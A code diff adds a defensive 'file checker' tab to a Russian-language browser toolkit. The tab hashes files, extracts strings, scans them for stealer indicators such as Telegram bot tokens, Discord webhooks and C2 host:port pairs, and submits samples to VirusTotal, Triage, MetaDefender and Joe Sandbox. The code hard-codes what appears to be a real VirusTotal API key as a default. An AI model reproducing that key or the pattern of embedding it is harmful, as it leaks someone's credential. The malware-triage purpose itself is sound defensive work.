+$('keyGen5').addEventListener('click',()=>{ const lines=[]; for(let i=0;i<5;i++) lines.push(genKey()); $('keyList').style.display='block'; $('keyList').textContent=lines.join('\n'); $('keyOut').value=lines[0]; });
 
-/* psdec */
 $('psDecRun').addEventListener('click',()=>{
-  let raw=$('psDecIn').value.trim(); const out=$('psDecOut');
+  const raw=$('psDecIn').value.trim();
   try{
-    let m=raw.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i);
-    let b64=m?m[1]:raw.replace(/\s+/g,'');
+    const m=raw.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i);
+    const b64=m?m[1]:raw.replace(/\s+/g,'');
     const bin=atob(b64); let utf16='';
     for(let i=0;i+1<bin.length;i+=2) utf16+=String.fromCharCode(bin.charCodeAt(i)|(bin.charCodeAt(i+1)<<8));
-    out.textContent=utf16;
-  }catch(e){ out.textContent='fail: '+e.message; }
+    $('psDecOut').textContent=utf16;
+  }catch(e){ $('psDecOut').textContent='fail '+e.message; }
 });
+
+/* ===== FILE CHECKER ===== */
+const LS_FC_KEYS = 'tk_fc_keys_v1';
+const LS_FC_HIST = 'tk_fc_hist_v1';
+(function loadFcKeys(){
+  try{
+    const k = JSON.parse(localStorage.getItem(LS_FC_KEYS)||'{}');
+    if(k.vt) $('fcVtKey').value = k.vt;
+    else $('fcVtKey').value = '3652f6ecd882a9bcf13f7e1c5096497b5b1c64d06a08215ee41b602ddbb2f1ea';
+    if(k.triage) $('fcTriageKey').value = k.triage;
+    if(k.md) $('fcMdKey').value = k.md;
+    if(k.joe) $('fcJoeKey').value = k.joe;
+    if(k.tbase) $('fcTriageBase').value = k.tbase;
+  }catch{}
+})();
+function saveFcKeys(){
+  localStorage.setItem(LS_FC_KEYS, JSON.stringify({
+    vt: $('fcVtKey').value.trim(),
+    triage: $('fcTriageKey').value.trim(),
+    md: $('fcMdKey').value.trim(),
+    joe: $('fcJoeKey').value.trim(),
+    tbase: $('fcTriageBase').value
+  }));
+}
+['fcVtKey','fcTriageKey','fcMdKey','fcJoeKey','fcTriageBase'].forEach(id=>{
+  const el=$(id); if(el) el.addEventListener('change', saveFcKeys);
+});
+
+async function sha256buf(buf){
+  const hash = await crypto.subtle.digest('SHA-256', buf);
+  return [...new Uint8Array(hash)].map(b=>b.toString(16).padStart(2,'0')).join('');
+}
+async function sha1buf(buf){
+  const hash = await crypto.subtle.digest('SHA-1', buf);
+  return [...new Uint8Array(hash)].map(b=>b.toString(16).padStart(2,'0')).join('');
+}
+function md5buf(buf){
+  /* minimal MD5 */
+  function md5cycle(x,k){var a=x[0],b=x[1],c=x[2],d=x[3];
+    a=ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
+    a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
+    a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
+    a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
+    a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
+    a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
+    a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
+    a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
+    a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
+    a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
+    a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
+    a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
+    a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
+    a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
+    a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
+    a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
+    x[0]=add32(a,x[0]);x[1]=add32(b,x[1]);x[2]=add32(c,x[2]);x[3]=add32(d,x[3]);}
+  function cmn(q,a,b,x,s,t){a=add32(add32(a,q),add32(x,t));return add32((a<<s)|(a>>> (32-s)),b);}
+  function ff(a,b,c,d,x,s,t){return cmn((b&c)|((~b)&d),a,b,x,s,t);}
+  function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&(~d)),a,b,x,s,t);}
+  function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
+  function ii(a,b,c,d,x,s,t){return cmn(c^(b|(~d)),a,b,x,s,t);}
+  function md51(s){var n=s.length,state=[1732584193,-271733879,-1732584194,271733878],i;
+    for(i=64;i<=n;i+=64) md5cycle(state, md5blk(s.substring(i-64,i)));
+    s=s.substring(i-64);var tail=Array(16).fill(0);
+    for(i=0;i<s.length;i++) tail[i>>2]|=s.charCodeAt(i)<<((i%4)<<3);
+    tail[i>>2]|=0x80<<((i%4)<<3); if(i>55){md5cycle(state,tail);tail=Array(16).fill(0);}
+    tail[14]=n*8; md5cycle(state,tail); return state;}
+  function md5blk(s){var md5blks=[],i; for(i=0;i<64;i+=4) md5blks[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24); return md5blks;}
+  var hex_chr='0123456789abcdef'.split('');
+  function rhex(n){var s='',j; for(j=0;j<4;j++) s+=hex_chr[(n>>(j*8+4))&0x0F]+hex_chr[(n>>(j*8))&0x0F]; return s;}
+  function hex(x){return x.map(rhex).join('');}
+  function add32(a,b){return (a+b)&0xFFFFFFFF;}
+  var u8=new Uint8Array(buf); var s=''; for(var i=0;i<u8.length;i++) s+=String.fromCharCode(u8[i]);
+  return hex(md51(s));
+}
+
+function extractIocs(text){
+  const ioc={tokens:[],webhooks:[],urls:[],ips:[],hosts:[],emails:[],mutex:[],paths:[]};
+  const tok=text.match(/\b\d{8,10}:[A-Za-z0-9_-]{30,}\b/g); if(tok) ioc.tokens=[...new Set(tok)];
+  const wh=text.match(/https?:\/\/(?:discord(?:app)?\.com|discordapp\.com)\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/gi); if(wh) ioc.webhooks=[...new Set(wh)];
+  const urls=text.match(/https?:\/\/[^\s"'<>]{8,200}/gi); if(urls) ioc.urls=[...new Set(urls)].slice(0,40);
+  const ips=text.match(/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g); if(ips) ioc.ips=[...new Set(ips)].filter(x=>!x.startsWith('0.')&&!x.startsWith('255.'));
+  const host=text.match(/\b(?:[a-z0-9-]+\.)+(?:com|net|org|io|ru|su|cc|tk|pw|top|xyz|me|info|biz)(?::\d{2,5})?\b/gi); if(host) ioc.hosts=[...new Set(host)].slice(0,40);
+  const em=text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g); if(em) ioc.emails=[...new Set(em)].slice(0,20);
+  const mu=text.match(/(?:Global\\|Local\\)?[A-Za-z0-9]{4,}Mutex[A-Za-z0-9]*/g); if(mu) ioc.mutex=[...new Set(mu)].slice(0,15);
+  const paths=text.match(/[A-Za-z]:\\(?:[^\x00-\x1f"'<>|]{3,80})/g); if(paths) ioc.paths=[...new Set(paths)].slice(0,20);
+  /* c2 style host:port */
+  const hp=text.match(/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?):\d{2,5}\b/g);
+  if(hp) ioc.hosts=[...new Set([...(ioc.hosts||[]),...hp])];
+  return ioc;
+}
+
+function stringsFromBuf(buf, minLen){
+  minLen=minLen||5;
+  const u8=new Uint8Array(buf);
+  let out='', cur='';
+  for(let i=0;i<u8.length;i++){
+    const c=u8[i];
+    if(c>=32&&c<=126) cur+=String.fromCharCode(c);
+    else { if(cur.length>=minLen) out+=cur+'\n'; cur=''; }
+  }
+  if(cur.length>=minLen) out+=cur+'\n';
+  /* utf16le rough */
+  cur='';
+  for(let i=0;i+1<u8.length;i+=2){
+    const c=u8[i]|(u8[i+1]<<8);
+    if(c>=32&&c<=126) cur+=String.fromCharCode(c);
+    else { if(cur.length>=minLen) out+=cur+'\n'; cur=''; }
+  }
+  return out;
+}
+
+function fileMagic(u8){
+  if(u8.length<4) return 'unknown';
+  if(u8[0]===0x4D&&u8[1]===0x5A) return 'PE/EXE (MZ)';
+  if(u8[0]===0x7F&&u8[1]===0x45&&u8[2]===0x4C&&u8[3]===0x46) return 'ELF';
+  if(u8[0]===0x50&&u8[1]===0x4B) return 'ZIP/Office/APK';
+  if(u8[0]===0x1F&&u8[1]===0x8B) return 'GZIP';
+  if(u8[0]===0x25&&u8[1]===0x50&&u8[2]===0x44&&u8[3]===0x46) return 'PDF';
+  if(u8[0]===0xD0&&u8[1]===0xCF) return 'OLE/CFB';
+  return 'data';
+}
+
+function entropy(buf){
+  const u8=new Uint8Array(buf); const freq=new Array(256).fill(0);
+  for(let i=0;i<u8.length;i++) freq[u8[i]]++;
+  let e=0; const n=u8.length||1;
+  for(let i=0;i<256;i++) if(freq[i]){ const p=freq[i]/n; e-=p*Math.log2(p); }
+  return e.toFixed(3);
+}
+
+function renderIoc(ioc){
+  const box=$('fcIoc'); let h='';
+  const add=(title,arr,cls)=>{ if(arr&&arr.length) h+=`<div><b>${title}</b><div class="${cls||''}">${arr.map(x=>esc(x)).join('<br>')}</div></div><br>`; };
+  add('TG bot tokens', ioc.tokens, 'det');
+  add('Discord webhooks', ioc.webhooks, 'det');
+  add('URLs', ioc.urls);
+  add('IP / host:port', [...new Set([...(ioc.ips||[]),...(ioc.hosts||[])])], 'warn');
+  add('Emails', ioc.emails);
+  add('Mutex', ioc.mutex);
+  add('Paths', ioc.paths);
+  if(!h) h='<div class="meta">IOC не найдены в строках</div>';
+  box.innerHTML=h; box.style.display='block';
+}
+
+function treeDetails(title, bodyHtml, open){
+  return `<details ${open?'open':''}><summary>${title}</summary>${bodyHtml}</details>`;
+}
+function leaf(cls, text){ return `<div class="leaf ${cls||''}">${text}</div>`; }
+
+async function vtLookup(hash, key){
+  const r=await fetch('https://www.virustotal.com/api/v3/files/'+hash,{headers:{'x-apikey':key}});
+  if(r.status===404) return {status:'not_found'};
+  if(!r.ok){ const t=await r.text(); throw new Error('VT '+r.status+' '+t.slice(0,120)); }
+  return r.json();
+}
+async function vtUpload(file, key){
+  const r=await fetch('https://www.virustotal.com/api/v3/files',{method:'POST',headers:{'x-apikey':key},body:(()=>{const fd=new FormData(); fd.append('file',file); return fd;})()});
+  if(!r.ok){ const t=await r.text(); throw new Error('VT upload '+r.status+' '+t.slice(0,120)); }
+  return r.json();
+}
+async function vtAnalysis(id, key){
+  const r=await fetch('https://www.virustotal.com/api/v3/analyses/'+id,{headers:{'x-apikey':key}});
+  if(!r.ok) throw new Error('VT analysis '+r.status);
+  return r.json();
+}
+
+async function triageSubmit(file, key, base){
+  const fd=new FormData();
+  fd.append('_json', JSON.stringify({kind:'file', interactive:false, profiles:['windows10-1903']}));
+  fd.append('file', file);
+  const r=await fetch(base.replace(/\/$/,'')+'/samples',{method:'POST',headers:{'Authorization':'Bearer '+key},body:fd});
+  if(!r.ok) throw new Error('Triage '+r.status+' '+(await r.text()).slice(0,100));
+  return r.json();
+}
+async function triageSample(id, key, base){
+  const r=await fetch(base.replace(/\/$/,'')+'/samples/'+id,{headers:{'Authorization':'Bearer '+key}});
+  if(!r.ok) throw new Error('Triage sample '+r.status);
+  return r.json();
+}
+
+async function mdHashLookup(hash, key){
+  const r=await fetch('https://api.metadefender.com/v4/hash/'+hash,{headers:{apikey:key}});
+  if(r.status===404) return {status:'not_found'};
+  if(!r.ok) throw new Error('MD '+r.status);
+  return r.json();
+}
+async function mdUpload(file, key){
+  const r=await fetch('https://api.metadefender.com/v4/file',{method:'POST',headers:{apikey:key, filename:file.name},body:file});
+  if(!r.ok) throw new Error('MD upload '+r.status);
+  return r.json();
+}
+
+async function joeSubmit(file, key){
+  const fd=new FormData();
+  fd.append('apikey', key);
+  fd.append('accept-tac', '1');
+  fd.append('systems', 'w10');
+  fd.append('sample', file);
+  const r=await fetch('https://www.joesandbox.com/api/v2/submit',{method:'POST',body:fd});
+  if(!r.ok) throw new Error('Joe '+r.status+' '+(await r.text()).slice(0,100));
+  return r.json();
+}
+
+function pushFcHist(entry){
+  try{
+    const h=JSON.parse(localStorage.getItem(LS_FC_HIST)||'[]');
+    h.unshift(entry);
+    localStorage.setItem(LS_FC_HIST, JSON.stringify(h.slice(0,50)));
+  }catch{}
+}
+function renderFcHist(){
+  const h=JSON.parse(localStorage.getItem(LS_FC_HIST)||'[]');
+  const box=$('fcHist');
+  if(!h.length){ box.innerHTML='<div class="hint">пусто</div>'; return; }
+  box.innerHTML=h.map((e,i)=>`<div class="msg-item" style="cursor:pointer" data-fhi="${i}">
+    <div class="msg-from">${new Date(e.t).toLocaleString('ru-RU')} · ${esc(e.name)} · ${e.size}b</div>
+    <div class="msg-body"><code>${esc(e.sha256)}</code><br>VT: ${esc(String(e.vt||'—'))} · IOC tokens: ${(e.ioc&&e.ioc.tokens||[]).length}</div>
+  </div>`).join('');
+  box.querySelectorAll('[data-fhi]').forEach(el=>{
+    el.addEventListener('click',()=>{
+      const e=h[+el.dataset.fhi]; if(!e) return;
+      $('fcSummary').innerHTML=`<div class="chan-card"><h3>${esc(e.name)}</h3>
+        <div class="chan-meta">SHA256: <code>${esc(e.sha256)}</code></div>
+        <div class="chan-meta">MD5: ${esc(e.md5||'')} · SHA1: ${esc(e.sha1||'')}</div>
+        <div class="chan-meta">${esc(e.type||'')} · entropy ${esc(String(e.entropy||''))}</div></div>`;
+      $('fcTree').innerHTML=e.treeHtml||'';
+      if(e.ioc) renderIoc(e.ioc);
+    });
+  });
+}
+$('fcHistRefresh').addEventListener('click', renderFcHist);
+$('fcHistClear').addEventListener('click',()=>{ localStorage.removeItem(LS_FC_HIST); renderFcHist(); });
+
+$('fcRun').addEventListener('click', async ()=>{
+  const file=$('fcFile').files[0];
+  if(!file) return alert('выбери файл');
+  saveFcKeys();
+  $('fcRun').disabled=true;
+  $('fcStatus').textContent='чтение файла...';
+  $('fcTree').innerHTML='';
+  $('fcSummary').innerHTML='';
+  $('fcIoc').style.display='none';
+  try{
+    const buf=await file.arrayBuffer();
+    const u8=new Uint8Array(buf);
+    const [sha256, sha1, md5]=await Promise.all([sha256buf(buf), sha1buf(buf), Promise.resolve(md5buf(buf))]);
+    const type=fileMagic(u8);
+    const ent=entropy(buf);
+    let ioc={tokens:[],webhooks:[],urls:[],ips:[],hosts:[],emails:[],mutex:[],paths:[]};
+    if($('fcDoLocal').checked){
+      $('fcStatus').textContent='локальные строки / IOC...';
+      const str=stringsFromBuf(buf, 6);
+      ioc=extractIocs(str);
+      renderIoc(ioc);
+    }
+    $('fcSummary').innerHTML=`<div class="chan-card">
+      <h3>${esc(file.name)}</h3>
+      <div class="chan-meta">size ${file.size} · ${esc(type)} · entropy ${ent}</div>
+      <div class="chan-meta">SHA256 <code>${sha256}</code></div>
+      <div class="chan-meta">SHA1 ${sha1}</div>
+      <div class="chan-meta">MD5 ${md5}</div>
+      <div class="chan-meta"><a href="https://www.virustotal.com/gui/file/${sha256}" target="_blank" rel="noopener">открыть на VT</a></div>
+    </div>`;
+
+    let tree='';
+    tree+=treeDetails('Локально', leaf('meta',`тип ${esc(type)}`) + leaf('meta',`entropy ${ent}`) + leaf('meta',`строк-кандидатов IOC: tokens=${ioc.tokens.length} wh=${ioc.webhooks.length} url=${ioc.urls.length}`), true);
+
+    /* VirusTotal */
+    let vtLabel='—';
+    if($('fcDoVt').checked && $('fcVtKey').value.trim()){
+      $('fcStatus').textContent='VirusTotal...';
+      const key=$('fcVtKey').value.trim();
+      try{
+        let data=await vtLookup(sha256, key);
+        if(data.status==='not_found'){
+          tree+=treeDetails('VirusTotal', leaf('warn','хэш не найден — upload...'));
+          $('fcStatus').textContent='VT upload...';
+          const up=await vtUpload(file, key);
+          const aid=up.data&&up.data.id;
+          if(aid){
+            for(let i=0;i<12;i++){
+              await sleep(3000);
+              const an=await vtAnalysis(aid, key);
+              const st=an.data&&an.data.attributes&&an.data.attributes.status;
+              $('fcStatus').textContent='VT analysis '+st+'...';
+              if(st==='completed'){
+                const stats=an.data.attributes.stats||{};
+                const results=an.data.attributes.results||{};
+                const mal=Object.entries(results).filter(([,v])=>v&&v.category==='malicious');
+                vtLabel=`${stats.malicious||0}/${(stats.malicious||0)+(stats.undetected||0)+(stats.harmless||0)}`;
+                let body=leaf(stats.malicious?'det':'clean', `детектов: ${stats.malicious||0} · suspicious: ${stats.suspicious||0} · clean: ${stats.undetected||0}`);
+                mal.slice(0,30).forEach(([eng,v])=>{ body+=leaf('det', `${esc(eng)}: ${esc(v.result||'malicious')}`); });
+                tree+=treeDetails('VirusTotal '+vtLabel, body, true);
+                break;
+              }
+            }
+          }
+        } else {
+          const a=data.data.attributes;
+          const stats=a.last_analysis_stats||{};
+          const results=a.last_analysis_results||{};
+          vtLabel=`${stats.malicious||0}/${Object.keys(results).length}`;
+          let body=leaf(stats.malicious?'det':'clean', `детектов: ${stats.malicious||0} / ${Object.keys(results).length}`);
+          body+=leaf('meta', `тип: ${esc((a.type_description||a.type_tag||''))}`);
+          body+=leaf('meta', `имя: ${esc((a.meaningful_name||a.names&&a.names[0]||''))}`);
+          if(a.popular_threat_classification){
+            const ptc=a.popular_threat_classification;
+            body+=leaf('det', `threat: ${esc((ptc.suggested_threat_label||''))}`);
+            (ptc.popular_threat_name||[]).slice(0,5).forEach(t=> body+=leaf('det', `family: ${esc(t.value)} (${t.count})`));
+          }
+          if(a.sandbox_verdicts){
+            Object.entries(a.sandbox_verdicts).forEach(([k,v])=>{
+              body+=leaf('warn', `sandbox ${esc(k)}: ${esc(v.category||'')} ${esc((v.malware_classification||[]).join(','))}`);
+            });
+          }
+          Object.entries(results).filter(([,v])=>v.category==='malicious').slice(0,40).forEach(([eng,v])=>{
+            body+=leaf('det', `${esc(eng)}: ${esc(v.result||'')}`);
+          });
+          if(a.tags&&a.tags.length) body+=leaf('meta','tags: '+esc(a.tags.join(', ')));
+          tree+=treeDetails('VirusTotal '+vtLabel, body, true);
+        }
+      }catch(e){
+        tree+=treeDetails('VirusTotal', leaf('err', esc(e.message)+' (часто CORS — открой ссылку VT вручную)'), true);
+      }
+    }
+
+    /* Triage */
+    if($('fcDoTriage').checked && $('fcTriageKey').value.trim()){
+      $('fcStatus').textContent='Triage submit...';
+      try{
+        const base=$('fcTriageBase').value;
+        const key=$('fcTriageKey').value.trim();
+        const sub=await triageSubmit(file, key, base);
+        const id=sub.id||sub.sample_id;
+        let body=leaf('meta','id '+esc(String(id||JSON.stringify(sub).slice(0,80))));
+        if(id){
+          for(let i=0;i<8;i++){
+            await sleep(4000);
+            const s=await triageSample(id, key, base);
+            body+=leaf('meta','status '+esc(s.status||s.error||''));
+            if(s.status==='reported'||s.status==='failed'){
+              if(s.tasks) body+=leaf('meta','tasks '+Object.keys(s.tasks).length);
+              break;
+            }
+            $('fcStatus').textContent='Triage '+ (s.status||'...') ;
+          }
+        }
+        tree+=treeDetails('Triage / RF', body, true);
+      }catch(e){ tree+=treeDetails('Triage / RF', leaf('err',esc(e.message)), true); }
+    }
+
+    /* MetaDefender */
+    if($('fcDoMd').checked && $('fcMdKey').value.trim()){
+      $('fcStatus').textContent='MetaDefender...';
+      try{
+        const key=$('fcMdKey').value.trim();
+        let data=await mdHashLookup(sha256, key);
+        if(data.status==='not_found'||data.error){
+          data=await mdUpload(file, key);
+          let body=leaf('meta','uploaded '+esc(JSON.stringify(data).slice(0,120)));
+          tree+=treeDetails('MetaDefender', body, true);
+        } else {
+          const res=data.scan_results||data;
+          let body=leaf(res.scan_all_result_a&&res.scan_all_result_a!=='No Threat Detected'?'det':'clean', esc(res.scan_all_result_a||res.process_info&&res.process_info.result||'ok'));
+          const details=res.scan_details||{};
+          Object.entries(details).forEach(([eng,v])=>{
+            body+=leaf(v.threat_found?'det':'clean', `${esc(eng)}: ${esc(v.threat_found||v.scan_result_i||'clean')}`);
+          });
+          tree+=treeDetails('MetaDefender', body, true);
+        }
+      }catch(e){ tree+=treeDetails('MetaDefender', leaf('err',esc(e.message)), true); }
+    }
+
+    /* Joe */
+    if($('fcDoJoe').checked && $('fcJoeKey').value.trim()){
+      $('fcStatus').textContent='Joe Sandbox...';
+      try{
+        const sub=await joeSubmit(file, $('fcJoeKey').value.trim());
+        tree+=treeDetails('Joe Sandbox', leaf('meta', esc(JSON.stringify(sub).slice(0,200))), true);
+      }catch(e){ tree+=treeDetails('Joe Sandbox', leaf('err',esc(e.message)), true); }
+    }
+
+    $('fcTree').innerHTML=tree;
+    $('fcStatus').textContent='готово';
+    pushFcHist({t:Date.now(), name:file.name, size:file.size, sha256, sha1, md5, type, entropy:ent, vt:vtLabel, ioc, treeHtml:tree});
+    hist('file_check',{name:file.name, sha256:sha256.slice(0,16)});
+    renderFcHist();
+  }catch(e){
+    $('fcStatus').textContent='ошибка: '+e.message;
+  }
+  $('fcRun').disabled=false;
+});
+
+/* open hist when tab */
+document.querySelectorAll('.tab').forEach(btn=>{
+  btn.addEventListener('click',()=>{ if(btn.dataset.tab==='fcheck') renderFcHist(); });
+});
+
 </script>
 </body>
 </html>
